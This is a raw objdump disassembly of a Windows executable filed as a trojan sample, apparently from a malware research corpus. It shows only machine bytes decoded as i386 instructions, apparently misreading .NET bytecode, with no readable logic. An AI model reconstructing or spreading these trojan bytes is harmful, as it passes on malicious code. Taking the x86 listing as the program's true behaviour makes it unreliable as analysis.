
malware_samples/trojan/cb52555f764752d30b0587817a4673797f495e9511bccf92fdce1e315765657a.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	a0 97 00 00 00       	mov    0x97,%al
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 34 4f 00       	add    $0x4f3400,%eax
  402013:	00 3c 48             	add    %bh,(%eax,%ecx,2)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	14 00                	adc    $0x0,%al
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1e                   	push   %ds
  402051:	02 28                	add    (%eax),%ch
  402053:	01 00                	add    %eax,(%eax)
  402055:	00 0a                	add    %cl,(%edx)
  402057:	2a 1e                	sub    (%esi),%bl
  402059:	02 28                	add    (%eax),%ch
  40205b:	04 00                	add    $0x0,%al
  40205d:	00 0a                	add    %cl,(%edx)
  40205f:	2a a6 73 06 00 00    	sub    0x673(%esi),%ah
  402065:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  40206b:	73 07                	jae    0x402074
  40206d:	00 00                	add    %al,(%eax)
  40206f:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  402075:	73 08                	jae    0x40207f
  402077:	00 00                	add    %al,(%eax)
  402079:	0a 80 03 00 00 04    	or     0x4000003(%eax),%al
  40207f:	73 09                	jae    0x40208a
  402081:	00 00                	add    %al,(%eax)
  402083:	0a 80 04 00 00 04    	or     0x4000004(%eax),%al
  402089:	2a 00                	sub    (%eax),%al
  40208b:	00 13                	add    %dl,(%ebx)
  40208d:	30 01                	xor    %al,(%ecx)
  40208f:	00 0f                	add    %cl,(%edi)
  402091:	00 00                	add    %al,(%eax)
  402093:	00 01                	add    %al,(%ecx)
  402095:	00 00                	add    %al,(%eax)
  402097:	11 7e 01             	adc    %edi,0x1(%esi)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	04 6f                	add    $0x6f,%al
  40209e:	0a 00                	or     (%eax),%al
  4020a0:	00 0a                	add    %cl,(%edx)
  4020a2:	0a 2b                	or     (%ebx),%ch
  4020a4:	00 06                	add    %al,(%esi)
  4020a6:	2a 00                	sub    (%eax),%al
  4020a8:	13 30                	adc    (%eax),%esi
  4020aa:	01 00                	add    %eax,(%eax)
  4020ac:	0f 00 00             	sldt   (%eax)
  4020af:	00 02                	add    %al,(%edx)
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	11 7e 02             	adc    %edi,0x2(%esi)
  4020b6:	00 00                	add    %al,(%eax)
  4020b8:	04 6f                	add    $0x6f,%al
  4020ba:	0b 00                	or     (%eax),%eax
  4020bc:	00 0a                	add    %cl,(%edx)
  4020be:	0a 2b                	or     (%ebx),%ch
  4020c0:	00 06                	add    %al,(%esi)
  4020c2:	2a 00                	sub    (%eax),%al
  4020c4:	13 30                	adc    (%eax),%esi
  4020c6:	01 00                	add    %eax,(%eax)
  4020c8:	0f 00 00             	sldt   (%eax)
  4020cb:	00 03                	add    %al,(%ebx)
  4020cd:	00 00                	add    %al,(%eax)
  4020cf:	11 7e 03             	adc    %edi,0x3(%esi)
  4020d2:	00 00                	add    %al,(%eax)
  4020d4:	04 6f                	add    $0x6f,%al
  4020d6:	0c 00                	or     $0x0,%al
  4020d8:	00 0a                	add    %cl,(%edx)
  4020da:	0a 2b                	or     (%ebx),%ch
  4020dc:	00 06                	add    %al,(%esi)
  4020de:	2a 00                	sub    (%eax),%al
  4020e0:	13 30                	adc    (%eax),%esi
  4020e2:	01 00                	add    %eax,(%eax)
  4020e4:	0f 00 00             	sldt   (%eax)
  4020e7:	00 04 00             	add    %al,(%eax,%eax,1)
  4020ea:	00 11                	add    %dl,(%ecx)
  4020ec:	7e 04                	jle    0x4020f2
  4020ee:	00 00                	add    %al,(%eax)
  4020f0:	04 6f                	add    $0x6f,%al
  4020f2:	0d 00 00 0a 0a       	or     $0xa0a0000,%eax
  4020f7:	2b 00                	sub    (%eax),%eax
  4020f9:	06                   	push   %es
  4020fa:	2a 00                	sub    (%eax),%al
  4020fc:	13 30                	adc    (%eax),%esi
  4020fe:	02 00                	add    (%eax),%al
  402100:	11 00                	adc    %eax,(%eax)
  402102:	00 00                	add    %al,(%eax)
  402104:	05 00 00 11 02       	add    $0x2110000,%eax
  402109:	03 28                	add    (%eax),%ebp
  40210b:	11 00                	adc    %eax,(%eax)
  40210d:	00 0a                	add    %cl,(%edx)
  40210f:	28 12                	sub    %dl,(%edx)
  402111:	00 00                	add    %al,(%eax)
  402113:	0a 0a                	or     (%edx),%cl
  402115:	2b 00                	sub    (%eax),%eax
  402117:	06                   	push   %es
  402118:	2a 00                	sub    (%eax),%al
  40211a:	00 00                	add    %al,(%eax)
  40211c:	13 30                	adc    (%eax),%esi
  40211e:	01 00                	add    %eax,(%eax)
  402120:	0b 00                	or     (%eax),%eax
  402122:	00 00                	add    %al,(%eax)
  402124:	06                   	push   %es
  402125:	00 00                	add    %al,(%eax)
  402127:	11 02                	adc    %eax,(%edx)
  402129:	28 13                	sub    %dl,(%ebx)
  40212b:	00 00                	add    %al,(%eax)
  40212d:	0a 0a                	or     (%edx),%cl
  40212f:	2b 00                	sub    (%eax),%eax
  402131:	06                   	push   %es
  402132:	2a 00                	sub    (%eax),%al
  402134:	13 30                	adc    (%eax),%esi
  402136:	01 00                	add    %eax,(%eax)
  402138:	0f 00 00             	sldt   (%eax)
  40213b:	00 07                	add    %al,(%edi)
  40213d:	00 00                	add    %al,(%eax)
  40213f:	11 d0                	adc    %edx,%eax
  402141:	05 00 00 02 28       	add    $0x28020000,%eax
  402146:	14 00                	adc    $0x0,%al
  402148:	00 0a                	add    %cl,(%edx)
  40214a:	0a 2b                	or     (%ebx),%ch
  40214c:	00 06                	add    %al,(%esi)
  40214e:	2a 00                	sub    (%eax),%al
  402150:	13 30                	adc    (%eax),%esi
  402152:	01 00                	add    %eax,(%eax)
  402154:	0b 00                	or     (%eax),%eax
  402156:	00 00                	add    %al,(%eax)
  402158:	08 00                	or     %al,(%eax)
  40215a:	00 11                	add    %dl,(%ecx)
  40215c:	02 28                	add    (%eax),%ch
  40215e:	15 00 00 0a 0a       	adc    $0xa0a0000,%eax
  402163:	2b 00                	sub    (%eax),%eax
  402165:	06                   	push   %es
  402166:	2a 00                	sub    (%eax),%al
  402168:	13 30                	adc    (%eax),%esi
  40216a:	01 00                	add    %eax,(%eax)
  40216c:	18 00                	sbb    %al,(%eax)
  40216e:	00 00                	add    %al,(%eax)
  402170:	09 00                	or     %eax,(%eax)
  402172:	00 11                	add    %dl,(%ecx)
  402174:	02 8c 01 00 00 1b 2d 	add    0x2d1b0000(%ecx,%eax,1),%cl
  40217b:	0a 28                	or     (%eax),%ch
  40217d:	01 00                	add    %eax,(%eax)
  40217f:	00 2b                	add    %ch,(%ebx)
  402181:	0a 2b                	or     (%ebx),%ch
  402183:	06                   	push   %es
  402184:	2b 04 02             	sub    (%edx,%eax,1),%eax
  402187:	0a 2b                	or     (%ebx),%ch
  402189:	00 06                	add    %al,(%esi)
  40218b:	2a 13                	sub    (%ebx),%dl
  40218d:	30 02                	xor    %al,(%edx)
  40218f:	00 10                	add    %dl,(%eax)
  402191:	00 00                	add    %al,(%eax)
  402193:	00 0a                	add    %cl,(%edx)
  402195:	00 00                	add    %al,(%eax)
  402197:	11 03                	adc    %eax,(%ebx)
  402199:	12 00                	adc    (%eax),%al
  40219b:	fe                   	(bad)
  40219c:	15 02 00 00 1b       	adc    $0x1b000002,%eax
  4021a1:	06                   	push   %es
  4021a2:	81 02 00 00 1b 2a    	addl   $0x2a1b0000,(%edx)
  4021a8:	1e                   	push   %ds
  4021a9:	02 28                	add    (%eax),%ch
  4021ab:	17                   	pop    %ss
  4021ac:	00 00                	add    %al,(%eax)
  4021ae:	0a 2a                	or     (%edx),%ch
  4021b0:	13 30                	adc    (%eax),%esi
  4021b2:	01 00                	add    %eax,(%eax)
  4021b4:	20 00                	and    %al,(%eax)
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	0b 00                	or     (%eax),%eax
  4021ba:	00 11                	add    %dl,(%ecx)
  4021bc:	7e 19                	jle    0x4021d7
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	0a 8c 03 00 00 1b 2d 	or     0x2d1b0000(%ebx,%eax,1),%cl
  4021c7:	0a 28                	or     (%eax),%ch
  4021c9:	02 00                	add    (%eax),%al
  4021cb:	00 2b                	add    %ch,(%ebx)
  4021cd:	80 19 00             	sbbb   $0x0,(%ecx)
  4021d0:	00 0a                	add    %cl,(%edx)
  4021d2:	7e 19                	jle    0x4021ed
  4021d4:	00 00                	add    %al,(%eax)
  4021d6:	0a 0a                	or     (%edx),%cl
  4021d8:	2b 00                	sub    (%eax),%eax
  4021da:	06                   	push   %es
  4021db:	2a 1e                	sub    (%esi),%bl
  4021dd:	02 28                	add    (%eax),%ch
  4021df:	17                   	pop    %ss
  4021e0:	00 00                	add    %al,(%eax)
  4021e2:	0a 2a                	or     (%edx),%ch
  4021e4:	13 30                	adc    (%eax),%esi
  4021e6:	01 00                	add    %eax,(%eax)
  4021e8:	56                   	push   %esi
  4021e9:	00 00                	add    %al,(%eax)
  4021eb:	00 00                	add    %al,(%eax)
  4021ed:	00 00                	add    %al,(%eax)
  4021ef:	00 72 01             	add    %dh,0x1(%edx)
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	70 80                	jo     0x402176
  4021f6:	06                   	push   %es
  4021f7:	00 00                	add    %al,(%eax)
  4021f9:	04 72                	add    $0x72,%al
  4021fb:	5b                   	pop    %ebx
  4021fc:	00 00                	add    %al,(%eax)
  4021fe:	70 80                	jo     0x402180
  402200:	08 00                	or     %al,(%eax)
  402202:	00 04 72             	add    %al,(%edx,%esi,2)
  402205:	8d 00                	lea    (%eax),%eax
  402207:	00 70 80             	add    %dh,-0x80(%eax)
  40220a:	09 00                	or     %eax,(%eax)
  40220c:	00 04 72             	add    %al,(%edx,%esi,2)
  40220f:	bf 00 00 70 80       	mov    $0x80700000,%edi
  402214:	0a 00                	or     (%eax),%al
  402216:	00 04 72             	add    %al,(%edx,%esi,2)
  402219:	f1                   	int1
  40221a:	00 00                	add    %al,(%eax)
  40221c:	70 28                	jo     0x402246
  40221e:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  402223:	0b 00                	or     (%eax),%eax
  402225:	00 04 72             	add    %al,(%edx,%esi,2)
  402228:	f5                   	cmc
  402229:	00 00                	add    %al,(%eax)
  40222b:	70 80                	jo     0x4021ad
  40222d:	0c 00                	or     $0x0,%al
  40222f:	00 04 72             	add    %al,(%edx,%esi,2)
  402232:	4f                   	dec    %edi
  402233:	01 00                	add    %eax,(%eax)
  402235:	70 80                	jo     0x4021b7
  402237:	0d 00 00 04 72       	or     $0x72040000,%eax
  40223c:	81 01 00 70 80 0e    	addl   $0xe807000,(%ecx)
  402242:	00 00                	add    %al,(%eax)
  402244:	04 2a                	add    $0x2a,%al
  402246:	00 00                	add    %al,(%eax)
  402248:	1e                   	push   %ds
  402249:	02 28                	add    (%eax),%ch
  40224b:	17                   	pop    %ss
  40224c:	00 00                	add    %al,(%eax)
  40224e:	0a 2a                	or     (%edx),%ch
  402250:	1e                   	push   %ds
  402251:	02 28                	add    (%eax),%ch
  402253:	17                   	pop    %ss
  402254:	00 00                	add    %al,(%eax)
  402256:	0a 2a                	or     (%edx),%ch
  402258:	1b 30                	sbb    (%eax),%esi
  40225a:	02 00                	add    (%eax),%al
  40225c:	e7 00                	out    %eax,$0x0
  40225e:	00 00                	add    %al,(%eax)
  402260:	0c 00                	or     $0x0,%al
  402262:	00 11                	add    %dl,(%ecx)
  402264:	7e 0b                	jle    0x402271
  402266:	00 00                	add    %al,(%eax)
  402268:	04 20                	add    $0x20,%al
  40226a:	e8 03 00 00 d8       	call   0xd8402272
  40226f:	28 20                	sub    %ah,(%eax)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 7e 06             	or     0x6(%esi),%bh
  402276:	00 00                	add    %al,(%eax)
  402278:	04 28                	add    $0x28,%al
  40227a:	3e 00 00             	add    %al,%ds:(%eax)
  40227d:	06                   	push   %es
  40227e:	28 21                	sub    %ah,(%ecx)
  402280:	00 00                	add    %al,(%eax)
  402282:	0a 80 06 00 00 04    	or     0x4000006(%eax),%al
  402288:	7e 08                	jle    0x402292
  40228a:	00 00                	add    %al,(%eax)
  40228c:	04 28                	add    $0x28,%al
  40228e:	3e 00 00             	add    %al,%ds:(%eax)
  402291:	06                   	push   %es
  402292:	28 21                	sub    %ah,(%ecx)
  402294:	00 00                	add    %al,(%eax)
  402296:	0a 80 08 00 00 04    	or     0x4000008(%eax),%al
  40229c:	7e 09                	jle    0x4022a7
  40229e:	00 00                	add    %al,(%eax)
  4022a0:	04 28                	add    $0x28,%al
  4022a2:	3e 00 00             	add    %al,%ds:(%eax)
  4022a5:	06                   	push   %es
  4022a6:	28 21                	sub    %ah,(%ecx)
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 80 09 00 00 04    	or     0x4000009(%eax),%al
  4022b0:	7e 0a                	jle    0x4022bc
  4022b2:	00 00                	add    %al,(%eax)
  4022b4:	04 28                	add    $0x28,%al
  4022b6:	3e 00 00             	add    %al,%ds:(%eax)
  4022b9:	06                   	push   %es
  4022ba:	28 21                	sub    %ah,(%ecx)
  4022bc:	00 00                	add    %al,(%eax)
  4022be:	0a 80 0a 00 00 04    	or     0x400000a(%eax),%al
  4022c4:	7e 0c                	jle    0x4022d2
  4022c6:	00 00                	add    %al,(%eax)
  4022c8:	04 28                	add    $0x28,%al
  4022ca:	3e 00 00             	add    %al,%ds:(%eax)
  4022cd:	06                   	push   %es
  4022ce:	28 21                	sub    %ah,(%ecx)
  4022d0:	00 00                	add    %al,(%eax)
  4022d2:	0a 80 0c 00 00 04    	or     0x400000c(%eax),%al
  4022d8:	7e 0d                	jle    0x4022e7
  4022da:	00 00                	add    %al,(%eax)
  4022dc:	04 28                	add    $0x28,%al
  4022de:	3e 00 00             	add    %al,%ds:(%eax)
  4022e1:	06                   	push   %es
  4022e2:	28 21                	sub    %ah,(%ecx)
  4022e4:	00 00                	add    %al,(%eax)
  4022e6:	0a 80 0d 00 00 04    	or     0x400000d(%eax),%al
  4022ec:	de 14 25 28 22 00 00 	ficoms 0x2228(,%eiz,1)
  4022f3:	0a 0c 16             	or     (%esi,%edx,1),%cl
  4022f6:	28 23                	sub    %ah,(%ebx)
  4022f8:	00 00                	add    %al,(%eax)
  4022fa:	0a 28                	or     (%eax),%ch
  4022fc:	24 00                	and    $0x0,%al
  4022fe:	00 0a                	add    %cl,(%edx)
  402300:	de 00                	fiadds (%eax)
  402302:	28 55 00             	sub    %dl,0x0(%ebp)
  402305:	00 06                	add    %al,(%esi)
  402307:	2d 06 16 28 23       	sub    $0x23281606,%eax
  40230c:	00 00                	add    %al,(%eax)
  40230e:	0a 28                	or     (%eax),%ch
  402310:	49                   	dec    %ecx
  402311:	00 00                	add    %al,(%eax)
  402313:	06                   	push   %es
  402314:	14 fe                	adc    $0xfe,%al
  402316:	06                   	push   %es
  402317:	15 00 00 06 73       	adc    $0x73060000,%eax
  40231c:	25 00 00 0a 73       	and    $0x730a0000,%eax
  402321:	26 00 00             	add    %al,%es:(%eax)
  402324:	0a 0a                	or     (%edx),%cl
  402326:	14 fe                	adc    $0xfe,%al
  402328:	06                   	push   %es
  402329:	16                   	push   %ss
  40232a:	00 00                	add    %al,(%eax)
  40232c:	06                   	push   %es
  40232d:	73 25                	jae    0x402354
  40232f:	00 00                	add    %al,(%eax)
  402331:	0a 73 26             	or     0x26(%ebx),%dh
  402334:	00 00                	add    %al,(%eax)
  402336:	0a 0b                	or     (%ebx),%cl
  402338:	06                   	push   %es
  402339:	6f                   	outsl  %ds:(%esi),(%dx)
  40233a:	27                   	daa
  40233b:	00 00                	add    %al,(%eax)
  40233d:	0a 07                	or     (%edi),%al
  40233f:	6f                   	outsl  %ds:(%esi),(%dx)
  402340:	27                   	daa
  402341:	00 00                	add    %al,(%eax)
  402343:	0a 07                	or     (%edi),%al
  402345:	6f                   	outsl  %ds:(%esi),(%dx)
  402346:	28 00                	sub    %al,(%eax)
  402348:	00 0a                	add    %cl,(%edx)
  40234a:	2a 00                	sub    (%eax),%al
  40234c:	01 10                	add    %edx,(%eax)
  40234e:	00 00                	add    %al,(%eax)
  402350:	00 00                	add    %al,(%eax)
  402352:	10 00                	adc    %al,(%eax)
  402354:	7a 8a                	jp     0x4022e0
  402356:	00 14 25 00 00 01 26 	add    %dl,0x26010000(,%eiz,1)
  40235d:	28 45 00             	sub    %al,0x0(%ebp)
  402360:	00 06                	add    %al,(%esi)
  402362:	26 2b 00             	sub    %es:(%eax),%eax
  402365:	2a 00                	sub    (%eax),%al
  402367:	00 ee                	add    %ch,%dh
  402369:	2b 35 73 29 00 00    	sub    0x2973,%esi
  40236f:	0a 20                	or     (%eax),%ah
  402371:	b8 0b 00 00 20       	mov    $0x2000000b,%eax
  402376:	10 27                	adc    %ah,(%edi)
  402378:	00 00                	add    %al,(%eax)
  40237a:	6f                   	outsl  %ds:(%esi),(%dx)
  40237b:	2a 00                	sub    (%eax),%al
  40237d:	00 0a                	add    %cl,(%edx)
  40237f:	28 20                	sub    %ah,(%eax)
  402381:	00 00                	add    %al,(%eax)
  402383:	0a 7e 0f             	or     0xf(%esi),%bh
  402386:	00 00                	add    %al,(%eax)
  402388:	04 2d                	add    $0x2d,%al
  40238a:	0a 28                	or     (%eax),%ch
  40238c:	27                   	daa
  40238d:	00 00                	add    %al,(%eax)
  40238f:	06                   	push   %es
  402390:	28 19                	sub    %bl,(%ecx)
  402392:	00 00                	add    %al,(%eax)
  402394:	06                   	push   %es
  402395:	7e 15                	jle    0x4023ac
  402397:	00 00                	add    %al,(%eax)
  402399:	04 6f                	add    $0x6f,%al
  40239b:	2b 00                	sub    (%eax),%eax
  40239d:	00 0a                	add    %cl,(%edx)
  40239f:	26 17                	es pop %ss
  4023a1:	2d c8 2a c6 16       	sub    $0x16c62ac8,%eax
  4023a6:	80 0f 00             	orb    $0x0,(%edi)
  4023a9:	00 04 14             	add    %al,(%esp,%edx,1)
  4023ac:	80 10 00             	adcb   $0x0,(%eax)
  4023af:	00 04 16             	add    %al,(%esi,%edx,1)
  4023b2:	6a 80                	push   $0xffffff80
  4023b4:	11 00                	adc    %eax,(%eax)
  4023b6:	00 04 14             	add    %al,(%esp,%edx,1)
  4023b9:	80 13 00             	adcb   $0x0,(%ebx)
  4023bc:	00 04 14             	add    %al,(%esp,%edx,1)
  4023bf:	80 14 00 00          	adcb   $0x0,(%eax,%eax,1)
  4023c3:	04 16                	add    $0x16,%al
  4023c5:	73 2d                	jae    0x4023f4
  4023c7:	00 00                	add    %al,(%eax)
  4023c9:	0a 80 15 00 00 04    	or     0x4000015(%eax),%al
  4023cf:	14 80                	adc    $0x80,%al
  4023d1:	16                   	push   %ss
  4023d2:	00 00                	add    %al,(%eax)
  4023d4:	04 2a                	add    $0x2a,%al
  4023d6:	00 00                	add    %al,(%eax)
  4023d8:	1e                   	push   %ds
  4023d9:	02 28                	add    (%eax),%ch
  4023db:	17                   	pop    %ss
  4023dc:	00 00                	add    %al,(%eax)
  4023de:	0a 2a                	or     (%edx),%ch
  4023e0:	1b 30                	sbb    (%eax),%esi
  4023e2:	06                   	push   %es
  4023e3:	00 aa 00 00 00 0d    	add    %ch,0xd000000(%edx)
  4023e9:	00 00                	add    %al,(%eax)
  4023eb:	11 7e 06             	adc    %edi,0x6(%esi)
  4023ee:	00 00                	add    %al,(%eax)
  4023f0:	04 17                	add    $0x17,%al
  4023f2:	8d 2c 00             	lea    (%eax,%eax,1),%ebp
  4023f5:	00 01                	add    %al,(%ecx)
  4023f7:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4023fa:	04 16                	add    $0x16,%al
  4023fc:	1f                   	pop    %ds
  4023fd:	2c 9d                	sub    $0x9d,%al
  4023ff:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402402:	2e 00 00             	add    %al,%cs:(%eax)
  402405:	0a 73 29             	or     0x29(%ebx),%dh
  402408:	00 00                	add    %al,(%eax)
  40240a:	0a 7e 06             	or     0x6(%esi),%bh
  40240d:	00 00                	add    %al,(%eax)
  40240f:	04 17                	add    $0x17,%al
  402411:	8d 2c 00             	lea    (%eax,%eax,1),%ebp
  402414:	00 01                	add    %al,(%ecx)
  402416:	13 05 11 05 16 1f    	adc    0x1f160511,%eax
  40241c:	2c 9d                	sub    $0x9d,%al
  40241e:	11 05 6f 2e 00 00    	adc    %eax,0x2e6f
  402424:	0a 8e b7 6f 2f 00    	or     0x2f6fb7(%esi),%cl
  40242a:	00 0a                	add    %cl,(%edx)
  40242c:	9a 0a 06 28 41 00 00 	lcall  $0x0,$0x4128060a
  402433:	06                   	push   %es
  402434:	2c 48                	sub    $0x48,%al
  402436:	06                   	push   %es
  402437:	28 30                	sub    %dh,(%eax)
  402439:	00 00                	add    %al,(%eax)
  40243b:	0a 0b                	or     (%ebx),%cl
  40243d:	07                   	pop    %es
  40243e:	13 07                	adc    (%edi),%eax
  402440:	16                   	push   %ss
  402441:	13 06                	adc    (%esi),%eax
  402443:	2b 2f                	sub    (%edi),%ebp
  402445:	11 07                	adc    %eax,(%edi)
  402447:	11 06                	adc    %eax,(%esi)
  402449:	9a 0c 08 6f 31 00 00 	lcall  $0x0,$0x316f080c
  402450:	0a 28                	or     (%eax),%ch
  402452:	1a 00                	sbb    (%eax),%al
  402454:	00 06                	add    %al,(%esi)
  402456:	26 7e 0f             	es jle 0x402468
  402459:	00 00                	add    %al,(%eax)
  40245b:	04 2c                	add    $0x2c,%al
  40245d:	02 de                	add    %dh,%bl
  40245f:	1c de                	sbb    $0xde,%al
  402461:	0c 28                	or     $0x28,%al
  402463:	22 00                	and    (%eax),%al
  402465:	00 0a                	add    %cl,(%edx)
  402467:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40246a:	00 0a                	add    %cl,(%edx)
  40246c:	de 00                	fiadds (%eax)
  40246e:	11 06                	adc    %eax,(%esi)
  402470:	17                   	pop    %ss
  402471:	d6                   	salc
  402472:	13 06                	adc    (%esi),%eax
  402474:	11 06                	adc    %eax,(%esi)
  402476:	11 07                	adc    %eax,(%edi)
  402478:	8e b7 32 c9 2b 07    	mov    0x72bc932(%edi),%?
  40247e:	06                   	push   %es
  40247f:	28 1a                	sub    %bl,(%edx)
  402481:	00 00                	add    %al,(%eax)
  402483:	06                   	push   %es
  402484:	26 de 0e             	fimuls %es:(%esi)
  402487:	25 28 22 00 00       	and    $0x2228,%eax
  40248c:	0a 0d 28 24 00 00    	or     0x2428,%cl
  402492:	0a de                	or     %dh,%bl
  402494:	00 2a                	add    %ch,(%edx)
  402496:	00 00                	add    %al,(%eax)
  402498:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40249b:	00 00                	add    %al,(%eax)
  40249d:	00 5f 00             	add    %bl,0x0(%edi)
  4024a0:	17                   	pop    %ss
  4024a1:	76 00                	jbe    0x4024a3
  4024a3:	0c 25                	or     $0x25,%al
  4024a5:	00 00                	add    %al,(%eax)
  4024a7:	01 00                	add    %eax,(%eax)
  4024a9:	00 00                	add    %al,(%eax)
  4024ab:	00 9b 9b 00 0e 25    	add    %bl,0x250e009b(%ebx)
  4024b1:	00 00                	add    %al,(%eax)
  4024b3:	01 1b                	add    %ebx,(%ebx)
  4024b5:	30 07                	xor    %al,(%edi)
  4024b7:	00 30                	add    %dh,(%eax)
  4024b9:	01 00                	add    %eax,(%eax)
  4024bb:	00 0e                	add    %cl,(%esi)
  4024bd:	00 00                	add    %al,(%eax)
  4024bf:	11 18                	adc    %ebx,(%eax)
  4024c1:	17                   	pop    %ss
  4024c2:	1c 73                	sbb    $0x73,%al
  4024c4:	32 00                	xor    (%eax),%al
  4024c6:	00 0a                	add    %cl,(%edx)
  4024c8:	80 10 00             	adcb   $0x0,(%eax)
  4024cb:	00 04 15 6a 80 11 00 	add    %al,0x11806a(,%edx,1)
  4024d2:	00 04 17             	add    %al,(%edi,%edx,1)
  4024d5:	8d 33                	lea    (%ebx),%esi
  4024d7:	00 00                	add    %al,(%eax)
  4024d9:	01 80 12 00 00 04    	add    %eax,0x4000012(%eax)
  4024df:	73 33                	jae    0x402514
  4024e1:	00 00                	add    %al,(%eax)
  4024e3:	0a 80 13 00 00 04    	or     0x4000013(%eax),%al
  4024e9:	7e 10                	jle    0x4024fb
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 20                	add    $0x20,%al
  4024ef:	00 c8                	add    %cl,%al
  4024f1:	00 00                	add    %al,(%eax)
  4024f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f4:	34 00                	xor    $0x0,%al
  4024f6:	00 0a                	add    %cl,(%edx)
  4024f8:	7e 10                	jle    0x40250a
  4024fa:	00 00                	add    %al,(%eax)
  4024fc:	04 20                	add    $0x20,%al
  4024fe:	00 c8                	add    %cl,%al
  402500:	00 00                	add    %al,(%eax)
  402502:	6f                   	outsl  %ds:(%esi),(%dx)
  402503:	35 00 00 0a 7e       	xor    $0x7e0a0000,%eax
  402508:	10 00                	adc    %al,(%eax)
  40250a:	00 04 02             	add    %al,(%edx,%eax,1)
  40250d:	7e 08                	jle    0x402517
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 28                	add    $0x28,%al
  402513:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402518:	36 00 00             	add    %al,%ss:(%eax)
  40251b:	0a 02                	or     (%edx),%al
  40251d:	80 07 00             	addb   $0x0,(%edi)
  402520:	00 04 17             	add    %al,(%edi,%edx,1)
  402523:	80 0f 00             	orb    $0x0,(%edi)
  402526:	00 04 73             	add    %al,(%ebx,%esi,2)
  402529:	17                   	pop    %ss
  40252a:	00 00                	add    %al,(%eax)
  40252c:	0a 28                	or     (%eax),%ch
  40252e:	11 00                	adc    %eax,(%eax)
  402530:	00 0a                	add    %cl,(%edx)
  402532:	80 16 00             	adcb   $0x0,(%esi)
  402535:	00 04 28             	add    %al,(%eax,%ebp,1)
  402538:	1b 00                	sbb    (%eax),%eax
  40253a:	00 06                	add    %al,(%esi)
  40253c:	28 21                	sub    %ah,(%ecx)
  40253e:	00 00                	add    %al,(%eax)
  402540:	0a 28                	or     (%eax),%ch
  402542:	25 00 00 06 16       	and    $0x16060000,%eax
  402547:	80 19 00             	sbbb   $0x0,(%ecx)
  40254a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40254d:	10 00                	adc    %al,(%eax)
  40254f:	00 04 7e             	add    %al,(%esi,%edi,2)
  402552:	12 00                	adc    (%eax),%al
  402554:	00 04 16             	add    %al,(%esi,%edx,1)
  402557:	7e 12                	jle    0x40256b
  402559:	00 00                	add    %al,(%eax)
  40255b:	04 8e                	add    $0x8e,%al
  40255d:	b7 16                	mov    $0x16,%bh
  40255f:	14 fe                	adc    $0xfe,%al
  402561:	06                   	push   %es
  402562:	23 00                	and    (%eax),%eax
  402564:	00 06                	add    %al,(%esi)
  402566:	73 37                	jae    0x40259f
  402568:	00 00                	add    %al,(%eax)
  40256a:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  40256d:	38 00                	cmp    %al,(%eax)
  40256f:	00 0a                	add    %cl,(%edx)
  402571:	26 14 fe             	es adc $0xfe,%al
  402574:	06                   	push   %es
  402575:	2a 00                	sub    (%eax),%al
  402577:	00 06                	add    %al,(%esi)
  402579:	73 39                	jae    0x4025b4
  40257b:	00 00                	add    %al,(%eax)
  40257d:	0a 0b                	or     (%ebx),%cl
  40257f:	07                   	pop    %es
  402580:	14 73                	adc    $0x73,%al
  402582:	29 00                	sub    %eax,(%eax)
  402584:	00 0a                	add    %cl,(%edx)
  402586:	20 10                	and    %dl,(%eax)
  402588:	27                   	daa
  402589:	00 00                	add    %al,(%eax)
  40258b:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402591:	2a 00                	sub    (%eax),%al
  402593:	00 0a                	add    %cl,(%edx)
  402595:	73 29                	jae    0x4025c0
  402597:	00 00                	add    %al,(%eax)
  402599:	0a 20                	or     (%eax),%ah
  40259b:	10 27                	adc    %ah,(%edi)
  40259d:	00 00                	add    %al,(%eax)
  40259f:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  4025a5:	2a 00                	sub    (%eax),%al
  4025a7:	00 0a                	add    %cl,(%edx)
  4025a9:	73 3a                	jae    0x4025e5
  4025ab:	00 00                	add    %al,(%eax)
  4025ad:	0a 80 14 00 00 04    	or     0x4000014(%eax),%al
  4025b3:	14 fe                	adc    $0xfe,%al
  4025b5:	06                   	push   %es
  4025b6:	28 00                	sub    %al,(%eax)
  4025b8:	00 06                	add    %al,(%esi)
  4025ba:	73 39                	jae    0x4025f5
  4025bc:	00 00                	add    %al,(%eax)
  4025be:	0a 14 17             	or     (%edi,%edx,1),%dl
  4025c1:	17                   	pop    %ss
  4025c2:	73 3a                	jae    0x4025fe
  4025c4:	00 00                	add    %al,(%eax)
  4025c6:	0a 80 17 00 00 04    	or     0x4000017(%eax),%al
  4025cc:	de 20                	fisubs (%eax)
  4025ce:	25 28 22 00 00       	and    $0x2228,%eax
  4025d3:	0a 0c 16             	or     (%esi,%edx,1),%cl
  4025d6:	80 0f 00             	orb    $0x0,(%edi)
  4025d9:	00 04 28             	add    %al,(%eax,%ebp,1)
  4025dc:	24 00                	and    $0x0,%al
  4025de:	00 0a                	add    %cl,(%edx)
  4025e0:	de 0c 7e             	fimuls (%esi,%edi,2)
